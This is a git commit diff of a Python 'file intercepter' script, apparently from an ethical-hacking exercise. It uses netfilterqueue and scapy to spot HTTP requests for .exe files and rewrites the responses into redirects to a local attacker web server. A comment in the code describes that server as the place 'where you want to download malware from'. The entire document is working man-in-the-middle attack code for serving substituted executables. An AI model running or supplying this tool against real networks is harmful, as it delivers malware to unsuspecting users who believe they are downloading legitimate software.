f397e2c68af942bf0c453b78b88d31257a6171e6
walter v <waltervannoy@yahoo.com>
2025-01-27 20:36:22 -0600

    WIP: file intercepter, working out kinks

--- replace_downloads/replace_downloads.py
+++ replace_downloads/replace_downloads.py
@@ -7,31 +7,35 @@
 import netfilterqueue
 import scapy.all as scapy
 
+def set_packet(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    packet.set_payload(bytes(packet))
+    return packet
+
 ack_list = []
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] HTTP packet being sent...")
-            if ".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] exe request found...")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] HTTP packet being received...")
-            if scapy_packet[scapy.TCP].seq in ack_list[0]:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file...")
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-701.exe\n\n"
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(bytes(scapy_packet))
-
-
+        if scapy_packet.haslayer(scapy.TCP):
+            if scapy_packet[scapy.TCP].dport == 80:
+                print("[+] HTTP packet being sent...")
+                if ".exe" in scapy_packet[scapy.Raw].load.decode():
+                    print("[+] exe request found...")
+                    ack_list.append(scapy_packet[scapy.TCP].ack)
+                    print(scapy_packet.show())
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("[+] HTTP packet being received...")
+                if scapy_packet[scapy.TCP].seq in ack_list:
+                    ack_list.remove(scapy_packet[scapy.TCP].seq)
+                    print("[+] Replacing file...")
+                    modified_packet = set_packet(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.119.139/test.exe\n\n") #location in your webserver where you want to download malware from
+                    packet.set_payload(bytes(modified_packet))
 
     packet.accept()
 
 queue= netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
+queue.bind(1, process_packet)
 queue.run()
